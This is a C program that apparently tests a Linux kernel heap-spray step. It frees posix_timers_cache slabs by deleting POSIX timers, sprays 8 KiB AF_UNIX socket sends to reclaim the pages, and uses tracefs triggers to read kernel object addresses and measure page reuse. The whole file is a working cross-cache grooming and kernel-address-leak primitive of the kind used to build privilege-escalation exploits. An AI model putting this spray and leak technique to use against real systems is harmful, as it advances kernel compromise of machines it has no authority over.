/* spraytest — does an 8 KiB AF_UNIX skb spray capture the pages of a just-freed
 * posix_timers_cache slab set?  Formula-free A/B test:
 *
 *   A. create N timers, read trace_pipe_raw, record their 8 KiB page bases
 *   B. delete all N timers (slabs return to the allocator)
 *   C. spray 8 KiB sends over M socketpairs
 *   D. create N timers again and record their page bases
 *   E. overlap(A, D): low overlap => the spray took those pages
 *
 * No kernel memory is written; only timer/socket syscalls and tracefs reads.
 */
#define _GNU_SOURCE 1
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

#define TRACE "/sys/kernel/tracing"
#define PAGE_OFFSET UINT64_C(0xffffff8000000000)
#define KITIMER_SIZE 264u

static int wf(const char *path, const char *text)
{
	int fd = open(path, O_WRONLY | O_CLOEXEC);
	ssize_t n;
	if (fd < 0)
		return -1;
	n = write(fd, text, strlen(text));
	close(fd);
	return n == (ssize_t)strlen(text) ? 0 : -1;
}

static void pin_cpu(int cpu)
{
	cpu_set_t s;
	CPU_ZERO(&s);
	CPU_SET(cpu, &s);
	sched_setaffinity(0, sizeof(s), &s);
}

static int read_raw_cpu0(uint8_t *buf, size_t cap, size_t *used)
{
	int fd = open(TRACE "/per_cpu/cpu0/trace_pipe_raw",
		      O_RDONLY | O_NONBLOCK | O_CLOEXEC);
	if (fd < 0)
		return -1;
	*used = 0;
	while (*used + 4096 < cap) {
		ssize_t r = read(fd, buf + *used, cap - *used);
		if (r > 0) {
			*used += (size_t)r;
			continue;
		}
		if (r < 0 && errno == EINTR)
			continue;
		break;
	}
	close(fd);
	return 0;
}

static int collect_ptrs(const uint8_t *buf, size_t used, uint64_t *site_out,
			uint64_t *ptrs, int cap)
{
	uint64_t sites[4096];
	uint64_t vals[4096];
	int n = 0, bestc = 0;
	uint64_t best = 0;
	for (size_t o = 0; o + 40 <= used; o++) {
		uint64_t site, ptr;
		uint32_t req;
		memcpy(&site, buf + o, 8);
		memcpy(&ptr, buf + o + 8, 8);
		memcpy(&req, buf + o + 16, 4);
		if ((site >> 48) != 0xffff || (ptr >> 48) != 0xffff || (ptr & 7))
			continue;
		if (req != KITIMER_SIZE)
			continue;
		if (n < 4096) {
			sites[n] = site;
			vals[n] = ptr;
			n++;
		}
	}
	for (int i = 0; i < n; i++) {
		int c = 0;
		for (int j = 0; j < n; j++)
			if (sites[j] == sites[i])
				c++;
		if (c > bestc) {
			bestc = c;
			best = sites[i];
		}
	}
	*site_out = best;
	{
		int k = 0;
		for (int i = 0; i < n && k < cap; i++)
			if (sites[i] == best)
				ptrs[k++] = vals[i];
		n = k;
	}
	return n;
}

static int pages_of(const uint64_t *ptrs, int n, uint64_t *pages, int cap)
{
	int np = 0;
	for (int i = 0; i < n; i++) {
		uint64_t page = ptrs[i] & ~UINT64_C(0x1fff);
		int seen = 0;
		for (int j = 0; j < np; j++)
			if (pages[j] == page) {
				seen = 1;
				break;
			}
		if (!seen && np < cap)
			pages[np++] = page;
	}
	return np;
}

static void kick_rss(void)
{
	size_t len = 16u << 20;
	char *p = mmap(NULL, len, PROT_READ | PROT_WRITE,
		       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (p != MAP_FAILED) {
		for (size_t i = 0; i < len; i += 4096)
			p[i] = 1;
		munmap(p, len);
	}
}

struct spray {
	int (*p)[2];
	int n;
};

int main(int argc, char **argv)
{
	int ntimers = argc > 1 ? atoi(argv[1]) : 2048;
	int nsock = argc > 2 ? atoi(argv[2]) : 4096;
	uint8_t *raw = malloc(32u << 20);
	uint64_t *p1 = calloc(4096, sizeof(uint64_t));
	uint64_t *p2 = calloc(4096, sizeof(uint64_t));
	static uint64_t ptrs[4096];
	timer_t *batch = calloc((size_t)ntimers, sizeof(timer_t));
	struct sigevent ev;
	struct spray sp = { 0 };
	uint64_t site1 = 0, site2 = 0;
	size_t used = 0;
	int made, nrec, n1, n2, inter = 0;

	if (!raw || !p1 || !p2 || !batch)
		return 1;
	memset(&ev, 0, sizeof(ev));
	ev.sigev_notify = SIGEV_NONE;

	pin_cpu(0);
	wf(TRACE "/tracing_on", "0\n");
	wf(TRACE "/buffer_size_kb", "16384\n");
	wf(TRACE "/events/kmem/rss_stat/enable", "1\n");
	wf(TRACE "/events/kmem/rss_stat/trigger", "enable_event:kmem:kmem_cache_alloc\n");
	kick_rss();
	{
		int d = open(TRACE "/per_cpu/cpu0/trace_pipe_raw", O_RDONLY | O_NONBLOCK);
		char junk[65536];
		if (d >= 0) {
			while (read(d, junk, sizeof(junk)) > 0)
				;
			close(d);
		}
	}

	/* pre-create sockets so the send happens right after the free */
	sp.p = calloc((size_t)nsock, sizeof(sp.p[0]));
	for (int i = 0; i < nsock; i++) {
		if (socketpair(AF_UNIX, SOCK_STREAM, 0, sp.p[i]))
			break;
		sp.n++;
	}
	printf("socks=%d\n", sp.n);

	/* A. first batch */
	made = 0;
	wf(TRACE "/tracing_on", "1\n");
	for (int i = 0; i < ntimers; i++)
		if (timer_create(CLOCK_MONOTONIC, &ev, &batch[i]) == 0)
			made++;
	wf(TRACE "/tracing_on", "0\n");
	read_raw_cpu0(raw, 32u << 20, &used);
	nrec = collect_ptrs(raw, used, &site1, ptrs, 4096);
	n1 = pages_of(ptrs, nrec, p1, 4096);
	printf("A: timers=%d rec=%d pages=%d site=%#llx\n", made, nrec, n1,
	       (unsigned long long)site1);

	/* B. free them */
	for (int i = 0; i < made; i++)
		timer_delete(batch[i]);
	usleep(200000);

	{
		char pat[8192];
		int ok = 0;
		memset(pat, 0x42, sizeof(pat));
		for (int i = 0; i < sp.n; i++)
			if (send(sp.p[i][0], pat, sizeof(pat), MSG_DONTWAIT) ==
			    (ssize_t)sizeof(pat))
				ok++;
		printf("C: sent=%d of %d\n", ok, sp.n);
	}

	/* D. second batch */
	made = 0;
	wf(TRACE "/tracing_on", "1\n");
	for (int i = 0; i < ntimers; i++)
		if (timer_create(CLOCK_MONOTONIC, &ev, &batch[i]) == 0)
			made++;
	wf(TRACE "/tracing_on", "0\n");
	read_raw_cpu0(raw, 32u << 20, &used);
	nrec = collect_ptrs(raw, used, &site2, ptrs, 4096);
	n2 = pages_of(ptrs, nrec, p2, 4096);
	printf("D: timers=%d rec=%d pages=%d site=%#llx\n", made, nrec, n2,
	       (unsigned long long)site2);

	for (int i = 0; i < n1; i++)
		for (int j = 0; j < n2; j++)
			if (p1[i] == p2[j]) {
				inter++;
				break;
			}
	printf("PAGE_REUSE=%d/%d (low => spray captured the freed slabs)\n",
	       inter, n1 < n2 ? n1 : n2);

	for (int i = 0; i < made; i++)
		timer_delete(batch[i]);
	for (int i = 0; i < sp.n; i++) {
		close(sp.p[i][0]);
		close(sp.p[i][1]);
	}
	fflush(stdout);
	return 0;
}
